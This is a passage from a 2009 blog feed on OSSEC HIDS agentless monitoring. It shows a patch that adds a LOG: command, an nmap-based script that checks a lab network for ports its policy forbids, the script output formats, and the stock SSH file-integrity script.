some limitations in the implementation that I felt needed to be
addressed. As OSSEC agentless is designed to preform &lt;code&gt;syscheck&lt;/code&gt;
functions on remote hosts, more general features are hard (if not
impossible) to write into a script.&lt;/p&gt;

&lt;p&gt;Currently in OSSEC, agentless scripts are limited to the following commands:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;INFO:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The string following INFO will be logged to &lt;code&gt;/var/ossec/logs/ossec.log&lt;/code&gt; by OSSEC for debugging.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ERROR:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Error needs to be reported.  The string following this command is forwarded to the OSSEC manager, and the OSSEC process closes down the script.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;STORE:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;All the lines that follow this command will be added, stored, and compared to previous runs of the script.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;FWD:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The string following FWD is a colon delimited list of stats on a given file.  Example: &lt;code&gt;FWD: &amp;lt;size&amp;gt;:&amp;lt;permissions&amp;gt;:&amp;lt;uid&amp;gt;:&amp;lt;gid&amp;gt;:&amp;lt;md5&amp;gt;:&amp;lt;sha1&amp;gt; &amp;lt;path &amp;amp; file&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Given the choices listed here more advanced agentless scripts are just
not reasonably possible. I require the ability to pass more information
to the OSSEC agentless process and have it raise alerts based on this
information.&lt;/p&gt;

&lt;h3 id=&#34;solution-patch-ossec:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Solution patch OSSEC&lt;/h3&gt;

&lt;p&gt;So I starting digging into the OSSEC code. I am not a C coder, I don&amp;rsquo;t
even play one on TV, but the OSSEC&amp;rsquo;s code is clear and has just enough
comments to allow me to understand how things function. Once I saw where
the communication happens between ossec-agentless and it&amp;rsquo;s subprocess I
was quickly able to add a new OSSEC Agentless Command.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;LOG:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The string following LOG: will be passed into &lt;code&gt;ossec-analysisd&lt;/code&gt; and processed like all other log messages.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;This simple command allow scripts to generate messages that will get
processed by the standard OSSEC decoders and rules.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Direct download of patch: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt&#34; title=&#34;agentless.patch.txt&#34;&gt;agentless.patch.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;patching-ossec:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Patching OSSEC&lt;/h3&gt;

&lt;p&gt;The patch I created works with the current code release of OSSEC. To
apply the patch, first download OSSEC version 2.2 from the website. In
the instructions below, I have changed to the tmp directory first as we
will be removing the source files once we have finished the install.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# cd /tmp 
obsd46# ftp http://www.ossec.net/files/ossec-hids-2.2.tar.gz
Trying 75.126.165.213...
Requesting http://www.ossec.net/files/ossec-hids-2.2.tar.gz
100% |******************************************************************|   692 KB    00:03    
Successfully retrieved file.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now expand the downloaded archive and change into the newly created
directory &lt;code&gt;ossec-hids-2.2&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# tar xfz ossec-hids-2.2.tar.gz                                                                                                                                                   
obsd46# cd ossec-hids-2.2       
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is where most of the work will happen, but first we need to download the patch.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ftp http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt                             
Trying 75.101.150.229...
Requesting http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt
100% |******************************************************************| 10278       00:00    
Successfully retrieved file.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we just apply the patch. We will use the &lt;code&gt;patch&lt;/code&gt; command do
this, but using the argument &lt;code&gt;-p1&lt;/code&gt; to apply the patch cleanly to all
sub-directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# patch -p1 &amp;lt; agentless.patch.txt  
Hmm... this looks like a unified diff to me...
The text leading up to this was:
 |-------------------------
 |diff -r 55072a52aaa4 -r 673c04be67e9 etc/decoder.xml
 |--- a/etc/decoder.xml  Wed Nov 04 20:51:36 2009 -0500
 |+++ b/etc/decoder.xml  Fri Nov 06 19:53:36 2009 +0000
 |-------------------------
Patching file etc/decoder.xml using Plan A...
Hunk #1 succeeded at 70.
Hunk #2 succeeded at 1498.
Hmm...  The next patch looks like a unified diff to me...
The text leading up to this was:
 |-------------------------
 |diff -r 55072a52aaa4 -r 673c04be67e9 etc/rules/agentless_rules.xml
 |--- /dev/null  Thu Jan 01 00:00:00 1970 +0000
 |+++ b/etc/rules/agentless_rules.xml    Fri Nov 06 19:53:36 2009 +000 0
 |-------------------------
(Creating file etc/rules/agentless_rules.xml...)
Patching file etc/rules/agentless_rules.xml using Plan A...
Empty context always matches.
Hunk #1 succeeded at 1.
Hmm...  The next patch looks like a unified diff to me...
The text leading up to this was:
 |-------------------------
 |diff -r 55072a52aaa4 -r 673c04be67e9 etc/rules/ossec_rules.xml
 |--- a/etc/rules/ossec_rules.xml        Wed Nov 04 20:51:36 2009 -0500
 |+++ b/etc/rules/ossec_rules.xml        Fri Nov 06 19:53:36 2009 +0000
 |-------------------------
Patching file etc/rules/ossec_rules.xml using Plan A...
Hunk #1 succeeded at 153.
Hmm...  The next patch looks like a unified diff to me...
The text leading up to this was:
 |-------------------------
 |diff -r 55072a52aaa4 -r 673c04be67e9 etc/templates/config/rules.template
 |--- a/etc/templates/config/rules.template      Wed Nov 04 20:51:36 2009 -0500
 |+++ b/etc/templates/config/rules.template      Fri Nov 06 19:53:36 2009 +0000
 |-------------------------
Patching file etc/templates/config/rules.template using Plan A...
Hunk #1 succeeded at 44.
Hmm...  The next patch looks like a unified diff to me...
The text leading up to this was:
 |-------------------------
 |diff -r 55072a52aaa4 -r 673c04be67e9 src/agentlessd/scripts/nmap_policy
 |--- /dev/null  Thu Jan 01 00:00:00 1970 +0000
 |+++ b/src/agentlessd/scripts/nmap_policy       Fri Nov 06 19:53:36 2009 +0000
 |-------------------------
(Creating file src/agentlessd/scripts/nmap_policy...)
Patching file src/agentlessd/scripts/nmap_policy using Plan A...
Empty context always matches.
Hunk #1 succeeded at 1.
done 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we have a completed all the OSSEC 2.2 code patches for the
expanded agentless features. At this point you will need to
compile and install OSSEC. For full details the main
&lt;a href=&#34;http://www.ossec.net/main/documentation/&#34;&gt;OSSEC website&lt;/a&gt; covers this topic in
more detail. A key thing to note here is that OSSEC has to be installed
as a server or locally.&lt;/p&gt;

&lt;p&gt;Please see my article on how to enable &lt;a href=&#34;http://praetorianprefect.com/archives/2009/11/ossec-agentless-to-save-the-day/&#34;&gt;OSSEC agentless monitoring&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;making-use-of-the-new-features:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Making use of the new features&lt;/h3&gt;

&lt;p&gt;Now that we have a patched and installed version of OSSEC we can take
advantage of the newly added features. Included with the patch is a
new Agentless OSSEC script &lt;code&gt;nmap_policy&lt;/code&gt;. This script is really not
designed for production use, rather it&amp;rsquo;s geared to show how to use the
new agentless features.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s get into the details. Start by running the new script and looking
at the output. I should note that this script uses &lt;code&gt;python&lt;/code&gt; and needs at
least version 2.5 in order to parse the xml output from &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd45# (cd /var/ossec &amp;amp;&amp;amp; ./agentless -b 21,23,80 -n 172.17.20.20/32 )
INFO: Starting
INFO: running `nmap -p 21,23,80 -oX - 172.17.20.0/24` command
INFO: completed `nmap -p 21,23,80 -oX - 172.17.20.0/24` command
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)
LOG:alert=11 Policy violation port 23 (telnet) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.19 (00:18:8B:1E:27:A5 Dell)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.20 (00:0C:29:84:72:11 VMware)
LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.20 (00:0C:29:84:72:11 VMware)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.21 (00:0C:29:8D:39:E4 VMware)
LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.21 (00:0C:29:8D:39:E4 VMware)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.31 (00:0C:29:29:CF:35 VMware)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.32 (00:0C:29:58:5F:C1 VMware)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.57 (00:1E:0B:9D:C0:03 Hewlett Packard)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.91 (00:14:38:D8:01:DD Hewlett Packard)
LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.134 (00:1E:C2:03:2D:E8 Apple)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.202 (00:19:B9:24:7E:F2 Dell)
LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.203 (00:19:B9:24:7E:F2 Dell)
INFO: Ending
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So what this script does is run &lt;code&gt;nmap&lt;/code&gt; and looks for ports that are open
and not allowed per an internal policy. In this example I checked for
http, telnet, and ftp, but the selection of ports is configurable with
the &lt;code&gt;-b&lt;/code&gt;/&lt;code&gt;--badport&lt;/code&gt; arguments. The second argument &lt;code&gt;-n&lt;/code&gt;/&lt;code&gt;--network&lt;/code&gt; is
used to specify which IP addresses to scan. The format of this option is
very liberal, in fact any valid &lt;code&gt;nmap&lt;/code&gt; network specification will work.&lt;/p&gt;

&lt;p&gt;Just as I specified above any string following the &lt;code&gt;LOG:&lt;/code&gt; OSSEC
agentless command will be pushed to the &lt;code&gt;ossec-analysisd&lt;/code&gt; process for
decoding and rules filtering.&lt;/p&gt;

&lt;p&gt;As part of the patch I have also included an updated &lt;code&gt;decode.xml&lt;/code&gt; and
a new &lt;code&gt;agentless_rules.xml&lt;/code&gt; to begin the first level of processing
of output from the scripts. Using &lt;code&gt;ossec-logtest&lt;/code&gt; we can see this in
action, but due to how &lt;code&gt;ossec-agentlessd&lt;/code&gt; processes the messages we need
to slightly modify the output for it to work with &lt;code&gt;ossec-logtest&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# (cd /var/ossec &amp;amp;&amp;amp; ./bin/ossec-logtest )                                                                                                                                                            
2009/11/06 20:48:28 ossec-testrule: INFO: Started (pid: 9789).
ossec-testrule: Type one log per line.

Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)


**Phase 1: Completed pre-decoding.
       full event: &#39;Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;
       hostname: &#39;a&#39;
       program_name: &#39;(null)&#39;
       log: &#39;Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;

**Phase 2: Completed decoding.
       decoder: &#39;agentless&#39;
       id: &#39;11&#39;
       extra_data: &#39;Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;

**Phase 3: Completed filtering (rules).
       Rule id: &#39;10011&#39;
       Level: &#39;11&#39;
       Description: &#39;Agentless.&#39;
**Alert to be generated.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see from the output that a level 11 alert would be generated
for the line we just tested with &lt;code&gt;ossec-logtest&lt;/code&gt;. In the case of the
full output of the &lt;code&gt;nmap_policy&lt;/code&gt; script it has 13 &lt;code&gt;LOG:&lt;/code&gt; lines returned
and would have generated 13 alerts. Needless to say this is a lot of
alerts, so it&amp;rsquo;s up to you to tune and configure this correctly for your
environment.&lt;/p&gt;

&lt;p&gt;In our lab here at &lt;a href=&#34;http://www.praetoriansecuritygroup.com&#34;&gt;Praetorian&lt;/a&gt;
we don&amp;rsquo;t ever want to see the telnet port open. So lets make this script
live, but only checking for telnet. I am going to once again make use of
&lt;a href=&#34;http://bitbucket.org/jrossi/ossec-hids-tools/&#34;&gt;ossec-hids-tools&lt;/a&gt; to add
the new agentless monitoring. As is always the case a restart of OSSEC
will be needed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --add --host jrossi@172.17.20.0 --type nmap_policy 
--frequency 86400 --state periodic --argv &amp;quot;-p 23 -n 172.17.20.0/24&amp;quot;
obsd46# (cd /var/ossec &amp;amp;&amp;amp; ./bin/ossec-control restart )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While adding this new agentless script I had to specify a &lt;code&gt;--host&lt;/code&gt;
argument. This is required for OSSEC agentless as the host field is
&lt;strong&gt;NOT&lt;/strong&gt; optional. In the case of the script &lt;code&gt;nmap_policy&lt;/code&gt; it will have
no effect, but this needs to be taken into account when writing your own
scripts as the first argument passed will always be what you specified
as the host.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Ossec: Agentless Scripts</title>
      <link>https://jeremyrossi.com/blog/2009/10/03/ossec-agentless-scripts/</link>
      <pubDate>Sat, 03 Oct 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/10/03/ossec-agentless-scripts/</guid>
      <description>

&lt;p&gt;In my last OSSEC post &lt;a href=&#34;https://jeremyrossi.com/archives/2009/11/ossec-agentless-to-save-the-day/&#34;&gt;OSSEC: Agentless to save the day&lt;/a&gt; I went over how
to setup agentless monitoring using the built in scripts. With this post
I am going to get into the details of how to modify the OSSEC supplied
scripts to do your bidding.&lt;/p&gt;

&lt;h2 id=&#34;table-of-contents:7ec6254becbb3beb032261b324a91668&#34;&gt;Table of Contents&lt;/h2&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/Screen-shot-2009-11-02-at-8.06.14-PM.png&#34; border=&#34;1&#34; alt=&#34;ossec_logo&#34; width=&#34;66&#34; height=&#34;64&#34; /&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;#agentless_scripts&#34;&gt;Agentless Scripts&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#agentless_scripts_periodic_diff&#34;&gt;Periodic diff Specification&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#agentless_scripts_periodic&#34;&gt;Periodic Specification&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;#ssh_integrity_check_linux&#34;&gt;Agentless Script: ssh_integrity_check_linux&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;#ssh_dmz_linux&#34;&gt;Our own Agentless Script: ssh_dmz_linux&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#finding_setuid_setgid&#34;&gt;Finding all setuid and setgid files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#finding_app_files&#34;&gt;Finding all authentication and applications specific files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#merging_finds&#34;&gt;Merging finds&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#creating_ssh_dmz_linux&#34;&gt;Creating ssh_dmz_linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#testing_ssh_dmz_linux&#34;&gt;Testing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;agentless_scripts:7ec6254becbb3beb032261b324a91668&#34;&gt;Agentless Scripts&lt;/h2&gt;

&lt;p&gt;All scripts that work with OSSEC agentless security monitoring use
&lt;code&gt;stdout&lt;/code&gt; for communication and reporting to the OSSEC server. This makes
writing scripts for OSSEC simple as you do not need to do anything more
then print or echo to &lt;code&gt;stdout&lt;/code&gt;. The format of the output does need to
meet the OSSEC specification, but that is a very simple thing to do.&lt;/p&gt;

&lt;p&gt;Before we move to the specification details I need to explain that OSSEC
agentless runs to different types of scripts. Namely the following:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;periodic_diff&lt;/td&gt;
&lt;td&gt;Scripts output data to the OSSEC agentless process that will then be compared to past runs and if there are differences an OSSEC alert will be generated.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;periodic&lt;/td&gt;
&lt;td&gt;Scripts output controlled messages to the OSSEC agentless process that will then be processed accordingly.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;agentless_scripts_periodic_diff:7ec6254becbb3beb032261b324a91668&#34;&gt;Periodic diff Specification&lt;/h4&gt;

&lt;p&gt;The output for periodic_diff is very simple, any and all output after
the agentless command &amp;ldquo;&lt;code&gt;STORE: now&lt;/code&gt;&amp;rdquo; and before the next OSSEC Command
will be stored and compared for differences. This type of script is
mostly used for hardware devices such as Cisco IOS, Juniper JunOS, and
other products.&lt;/p&gt;

&lt;p&gt;Scripts that use the &lt;code&gt;periodic_diff&lt;/code&gt; make use of the following commands:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;INFO:&lt;/td&gt;
&lt;td&gt;The string following INFO will be logged to &lt;code&gt;/var/ossec/logs/ossec.log&lt;/code&gt; by OSSEC for debugging.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ERROR:&lt;/td&gt;
&lt;td&gt;Error needs to be reported.  The string following this command is forwarded to the OSSEC manager, and the OSSEC process closes down the script.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;STORE:&lt;/td&gt;
&lt;td&gt;All the lines that follows this command will be added stored and compared to previous runs of the script&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Here is an example of a periodic_diff script that comes with OSSEC.
(&lt;em&gt;Please note with all agentless scripts you must be in the root of the
OSSEC install for them to function correctly&lt;/em&gt;.)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46#( cd /var/ossec &amp;amp;&amp;amp; ./agentless/ssh_pixconfig_diff cisco@172.17.0.1 &#39;show hardware&#39; )
spawn ssh -c des cisco@172.17.0.1
No valid ciphers for protocol version 2 given, using defaults.
Password: 

a.zfw.tss&amp;gt;INFO: Starting.
enable
Password: 
a.zfw.tss#ok on enable pass

STORE: now
no pager
             ^
% Invalid input detected at &#39;^&#39; marker.

a.zfw.tss#term len 0
a.zfw.tss#terminal pager 0
                     ^
% Invalid input detected at &#39;^&#39; marker.

a.zfw.tss#show version | grep -v Configuration last| up
                         ^
% Invalid input detected at &#39;^&#39; marker.

a.zfw.tss#show running-config
Building configuration...


Current configuration : 14631 bytes
!
version 12.4

[................SNIP CONFIG.................]

a.zfw.tss#show hardware
Cisco IOS Software, 3800 Software (C3845-ADVENTERPRISEK9-M), Version 12.4(24)T1, RELEASE SOFTWARE (fc3)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2009 by Cisco Systems, Inc.
Compiled Fri 19-Jun-09 19:21 by prod_rel_team

ROM: System Bootstrap, Version 12.3(11r)T2, RELEASE SOFTWARE (fc1)

a.zfw.tss uptime is 1 week, 5 days, 7 hours, 29 minutes
System returned to ROM by reload at 13:34:26 UTC Thu Oct 22 2009
System image file is &amp;quot;flash:c3845-adventerprisek9-mz.124-24.T1.bin&amp;quot;


This product contains cryptographic features and is subject to United
States and local country laws governing import, export, transfer and
use. Delivery of Cisco cryptographic products does not imply
third-party authority to import, export, distribute or use encryption.
Importers, exporters, distributors and users are responsible for
compliance with U.S. and local country laws. By using this product you
agree to comply with applicable laws and regulations. If you are unable
to comply with U.S. and local laws, return this product immediately.

A summary of U.S. laws governing Cisco cryptographic products may be found at:
http://www.cisco.com/wwl/export/crypto/tool/stqrg.html

If you require further assistance please contact us by sending email to
export@cisco.com.

Cisco 3845 (revision 1.0) with 1007615K/40960K bytes of memory.
Processor board ID FTX1043A2CR
2 Gigabit Ethernet interfaces
1 ATM interface
1 Virtual Private Network (VPN) Module
4 CEM T1/E1 ports
DRAM configuration is 64 bits wide with parity enabled.
479K bytes of NVRAM.
492015K bytes of USB Flash usbflash0 (Read/Write)
62720K bytes of ATA System CompactFlash (Read/Write)

Configuration register is 0x2102


a.zfw.tss#exit
Connection to 172.17.0.1 closed by remote host.
Connection to 172.17.0.1 closed.

INFO: Finished.

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this example above the script would store the contents between
&amp;ldquo;&lt;code&gt;STORE: now&lt;/code&gt;&amp;rdquo; and &amp;ldquo;&lt;code&gt;INFO: Finished.&lt;/code&gt;&amp;rdquo;. If this is the first time that
OSSEC agentless has run this command no alerts would be generated and
the contents would have been saved for later comparisons. If OSSEC
agentless has a stored copy from a previous execution it will compare
the files and if there are any differences it will generate an alert.&lt;/p&gt;

&lt;h4 id=&#34;agentless_scripts_periodic:7ec6254becbb3beb032261b324a91668&#34;&gt;Periodic Specification&lt;/h4&gt;

&lt;p&gt;The periodic specification has more options and gives more control to
the script writer on what actions OSSEC will take. Once again &lt;code&gt;stdout&lt;/code&gt;
is used for communication so script writing is easy.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;INFO:&lt;/td&gt;
&lt;td&gt;The string following INFO will be logged to &lt;code&gt;/var/ossec/logs/ossec.log&lt;/code&gt; by OSSEC for debugging.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ERROR:&lt;/td&gt;
&lt;td&gt;Error needs to be reported.  The string following this command is forwarded to the OSSEC manager, and the OSSEC process closes down the script.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;FWD:&lt;/td&gt;
&lt;td&gt;The string following FWD is a colon delimited list of stats on a given file.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Example of real &lt;code&gt;FWD:&lt;/code&gt; command.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;FWD: 19419:600:0:0:fb30de5b02029950ae05885a3d407c8c:017cd6118cdc166ee8eba8af1b7fdad6763203d3 ./.bash_history
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The Fields break down in to the following&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Field&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;FWD:&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The OSSEC Command&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;19419&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Total size of file, in bytes&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;600&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Access rights of file in octal&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;User ID of file owner&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Group ID of file owner&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;fb30de5b02029950ae05885a3d407c8c&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;MD5 Hash of file&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;017cd6118cdc166ee8eba8af1b7fdad6763203d3&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;SHA1 Hash of file&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;./.bash_history&lt;/td&gt;
&lt;td&gt;Path and name of file&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Using this format OSSEC can store the information about a file and then
in the future run compare that they are the same. If for some reason
they are not the same an alert will be generated. Here is an example of
a password change on a linux system:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;OSSEC HIDS Notification.
2009 Sep 21 15:19:00

Received From: (ssh_integrity_check_linux) root@172.17.20.20-&amp;gt;syscheck
Rule: 550 fired (level 7) -&amp;gt; &amp;quot;Integrity checksum changed.&amp;quot;
Portion of the log(s):

Integrity checksum changed for: &#39;/etc/shadow&#39;
Old md5sum was: &#39;0d92e12c92f3edcf9d8876ea57c5f677&#39;
New md5sum is : &#39;2bd51b61dea17c5682fb2c0cf4f92c63&#39;
Old sha1sum was: &#39;2270c03a920ef8dd50e11cefdef046a8660f7a29&#39;
New sha1sum is : &#39;d9518ea9022b10d07f81925c6d7f2abb4364b548&#39;

--END OF NOTIFICATION
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ssh_integrity_check_linux:7ec6254becbb3beb032261b324a91668&#34;&gt;Agentless Script: ssh_integrity_check_linux&lt;/h2&gt;

&lt;p&gt;Now that we have an understanding of how agentless scripts communicate
with the parent OSSEC preocess, let&amp;rsquo;s move on to a working example. The
OSSEC supplied script &lt;code&gt;ssh_integrity_check_linux&lt;/code&gt; is a great place to
start, so lets open it up and see what is going on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-expect&#34;&gt;obsd46# cat /var/ossec/agentless/ssh_integrity_check_linux
 #!/usr/bin/env expect

 # @(#) $Id: ssh_integrity_check_linux,v 1.11 2009/06/24 17:06:21 dcid Exp $
 # Agentless monitoring
 #
 # Copyright (C) 2009 Trend Micro Inc.
 # All rights reserved.
 #
 # This program is a free software; you can redistribute it
 # and/or modify it under the terms of the GNU General Public
 # License (version 3) as published by the FSF - Free Software
 # Foundation.


 # Main script.
source &amp;quot;agentless/main.exp&amp;quot;


 # SSHing to the box and passing the directories to check.
if [catch {
    spawn ssh $hostname
} loc_error] {
    send_user &amp;quot;ERROR: Opening connection: $loc_error.\n&amp;quot;
    exit 1;
}


source $sshsrc
source $susrc

set timeout 600
send &amp;quot;echo \&amp;quot;INFO: Starting.\&amp;quot;; for i in `find $args 2&amp;gt;/dev/null`;do tail \$i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; 
md5=`md5sum \$i | cut -d \&amp;quot; \&amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum \$i | cut -d \&amp;quot; \&amp;quot; -f
 1` &amp;amp;&amp;amp; echo FWD: `stat --printf \&amp;quot;%s:%a:%u:%g\&amp;quot; \$i`:\$md5:\$sha1 \$i; done; exit\r&amp;quot;
send &amp;quot;exit\r&amp;quot;

expect {
    timeout {
        send_user &amp;quot;ERROR: Timeout while running commands on host: $hostname .\n&amp;quot;
        exit 1;
    }
    eof {
